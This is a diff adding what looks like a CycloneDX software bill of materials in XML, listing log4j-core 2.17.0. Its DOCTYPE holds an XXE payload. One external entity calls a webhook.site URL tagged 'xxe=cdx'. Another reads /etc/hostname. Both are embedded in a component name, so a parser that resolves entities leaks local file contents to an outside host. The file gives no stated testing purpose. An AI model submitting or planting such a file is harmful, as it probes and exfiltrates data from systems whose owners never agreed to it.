@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE bom [
+  <!ENTITY probe SYSTEM "http://webhook.site/bfac32e7-7c67-41f0-bf29-b2c2ff7238ce/?xxe=cdx&n=35422">
+  <!ENTITY file  SYSTEM "file:///etc/hostname">
+]>
+<bom xmlns="http://cyclonedx.org/schema/bom/1.4" version="1">
+  <metadata>
+    <timestamp>2026-06-05T00:00:00Z</timestamp>
+    <component type="library">
+      <name>probe-&probe;-&file;</name>
+      <version>1.0.0</version>
+    </component>
+  </metadata>
+  <components>
+    <component type="library">
+      <name>log4j-core</name>
+      <version>2.17.0</version>
+      <purl>pkg:maven/org.apache.logging.log4j/log4j-core@2.17.0</purl>
+    </component>
+  </components>
+</bom>
